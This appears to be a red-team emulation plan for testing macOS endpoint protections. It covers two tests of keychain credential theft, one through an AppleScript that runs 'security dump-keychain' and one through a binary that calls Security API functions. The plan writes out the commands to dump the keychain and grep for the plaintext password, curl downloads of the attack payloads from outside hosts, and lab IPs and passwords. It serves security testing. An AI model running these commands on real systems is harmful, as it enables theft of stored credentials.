# DPRK Protections Micros

## Test 9: Keychain dumping via AppleScript

### :microphone: Voice Track

Test 9 emulates the dumping of macOS keychains via AppleScript execution of the
`security` tool.

The setup on the victim host for this test includes pre-positioning of the
AppleScript on victim itzy (10.222.25.70) in /tmp, opening Terminal, then
elevating to root.

The test begins with execution of the AppleScript. The AppleScript executes the
following command, redirecting output to `/tmp/kc.txt`.

```bash
security dump-keychain -d /Library/Keychains/System.keychain > /tmp/kc.txt
```

The AppleScript executes the `security` tool via `do shell script` with the
`with administrator privileges` to avoid additional GUI password prompts.

Successful execution will create the `kc.txt` output file, containing the
machine account's plaintext password from being domain joined.

### :loud_sound: Noise
The following noise activity is executed:
Execute this section prior to Setup. Any blocks that occur during this section
will be considered for False Positive measurement.

* :arrow_right: Initiate an RDP session to the Windows jumpbox
`spitfire (223.246.0.90)`

* :arrow_right: From the Windows jumpbox `spitfire (223.246.0.90)`, initiate a VNC
session to the MacOS victim workstation `itzy (10.222.25.70)`.

    | Hostname | Password |
    | -------- | -------- |
    | 10.222.25.70::5900 | test1234 |

  * At the MacOS login screen, authenticate with the following credentials:

    | Username | Password |
    | -------- | -------- |
    | venom | Thin-Hash |

* Open Script Editor and save the following as `count_files.scpt`

    ```applescript
    tell application "Finder"
        set ffolder to choose folder
        set sccripts to every item of ffolder whose kind is not "folder"
        get count of sccripts
    end tell
    ```
* In Script Editor, click the Play ▶️ button to run the script. In the
Finder terminal to choose a folder, pick Applications


### :hammer: Setup

* :arrow_right: Initiate an RDP session to the Windows jumpbox
`spitfire (223.246.0.90)`

* :arrow_right: From the Windows jumpbox `spitfire (223.246.0.90)`, initiate a VNC
session to the macOS victim workstation `itzy (10.222.25.70)` if not already
connected.

    | Hostname | Password |
    | -------- | -------- |
    | 10.222.25.70::5900 | test1234 |

  * At the macOS login screen, authenticate with the following credentials:

    | Username | Password |
    | -------- | -------- |
    | venom | Thin-Hash |

* Open a Terminal and elevate to sudo, providing the following password when
prompted:

    ```bash
    sudo su
    ```

    | Password |
    | -------- |
    | Thin-Hash |

* Download the `test9.scpt` AppleScript

    ```bash
    curl --output /tmp/test9.scpt http://bw-er3ader.org/files-backup/test9.scpt
    ```

### :biohazard: Procedures

* Execute `test9.scpt`

    ```bash
    osascript /tmp/test9.scpt
    ```

* Run the following command to check the output for the plaintext password

    ```bash
    grep -A 10 "Active Directory" /tmp/kc.txt
    ```

* :camera: Screenshot the end state of the test and any command/application output (If a block occurred screenshot any alert/prompt).

### :broom: Cleanup

* In the elevated Terminal, delete `test9.scpt` and the output file

    ```bash
    rm /tmp/test9.scpt /tmp/kc.txt
    ```

* Exit and close the Terminal then sign out of the VNC session

### :mag: ATT&CK Techniques and Reference Code

:information_source: NOTE: Only the techniques under test are listed in this table

| Red Team Activity | Source Code Link | ATT&CK Technique |
| ----------------- | ---------------- | ---------------- |
| /bin/sh executes test9 AppleScript | - | T1059.002 Command and Scripting Interpreter: AppleScript |
| test9 executes the `security` utility | [security](../Resources/protections/test9/test9.scpt#L5) | T1059.004 Command and Scripting Interpreter: Unix Shell |
| test9 accesses the keychain for plaintext passwords via `security` | [dump-keychain](../Resources/protections/test9/test9.scpt#L1) | T1555.001 Credentials from Password Stores: Keychain |

## Test 10: Keychain dumping via Security API

### :microphone: Voice Track

Test 10 emulates the dumping of macOS keychains via API calls from Security.h.

The setup on the victim host for this test includes pre-positioning of a binary
on victim itzy (10.222.25.70) in /tmp, opening Terminal, then elevating to root.

The test begins with execution of the binary. The binary will disable user
interaction pop ups using `SecKeychainSetUserInterationAllowed` then set the
default keychain to `/private/var/root/Library/Keychains`. The binary will then
check access to the keychain using `SecKeychainCopyDefault`, verify it is
unlocked using `SecKeychainGetStatus`, then perform a search query for generic
password items (genp), returning all matching items and their
respective attributes using `SecItemCopyMatching`. On returned items, the
binary will then attempt to use `SecKeychainItemCopyContent` to print the
plaintext password content for the given keychain item.

Successful execution will print the machine account's plaintext password from
being domain joined.

### :loud_sound: Noise
The following noise activity is executed:
Execute this section prior to Setup. Any blocks that occur during this section
will be considered for False Positive measurement.
* :arrow_right: Initiate an RDP session to the Windows jumpbox
`spitfire (223.246.0.90)` if not already connected
* :arrow_right: From the Windows jumpbox `spitfire (223.246.0.90)`, initiate a VNC
session to the MacOS victim workstation `itzy (10.222.25.70)` if not already
connected.
    | Hostname | Password |
    | -------- | -------- |
    | 10.222.25.70::5900 | test1234 |
  * At the MacOS login screen, authenticate with the following credentials:
    | Username | Password |
    | -------- | -------- |
    | venom | Thin-Hash |
* Open Safari and browse to <https://www.jetbrains.com/idea/download/?section=mac>
to download IntelliJ. In the .dmg dropdown, select ".dmg (Apple Silicon)"
* Follow the instructions to install IntelliJ
* Once installation has completed, open IntelliJ


### :hammer: Setup

* :arrow_right: Initiate an RDP session to the Windows jumpbox
`spitfire (223.246.0.90)`

* :arrow_right: From the Windows jumpbox `spitfire (223.246.0.90)`, initiate a VNC
session to the macOS victim workstation `itzy (10.222.25.70)` if not already
connected.

    | Hostname | Password |
    | -------- | -------- |
    | 10.222.25.70::5900 | test1234 |

  * At the macOS login screen, authenticate with the following credentials:

    | Username | Password |
    | -------- | -------- |
    | venom | Thin-Hash |

* Open a Terminal and elevate to sudo, providing the following password when
prompted:

    ```bash
    sudo su
    ```

    | Password |
    | -------- |
    | Thin-Hash |

* Download the `test10` binary

    ```bash
    curl --output /tmp/test10 http://ta11-acfan.net/files-backup/test10
    ```

* Modify the file permissions to make `test10` executable

    ```bash
    chmod +x /tmp/test10
    ```

### :biohazard: Procedures

* Execute `test10`

    ```bash
    /tmp/test10
    ```

* :camera: Screenshot the end state of the test and any command/application output (If a block occurred screenshot any alert/prompt).

### :broom: Cleanup

* In the elevated Terminal, delete `test10`

    ```bash
    rm /tmp/test10
    ```

* Exit and close the Terminal then sign out of the VNC session

### :mag: ATT&CK Techniques and Reference Code

:information_source: NOTE: Only the techniques under test are listed in this table

| Red Team Activity | Source Code Link | ATT&CK Technique |
| ----------------- | ---------------- | ---------------- |
| /bin/sh executes test10 | - | T1059.004 Command and Scripting Interpreter: Unix Shell |
| test10 accesses the keychain for plaintext passwords via SecKeychainItemCopyContent | [getKeychainItemPassword](../Resources/protections/test10/src/keychain.m#L71) | T1555.001 Credentials from Password Stores: Keychain |

## Cleanup

* From your Kali attack host `corsair (223.246.0.70)`, return to your C2 terminal tab, and enter `ctrl+c` to stop the C2.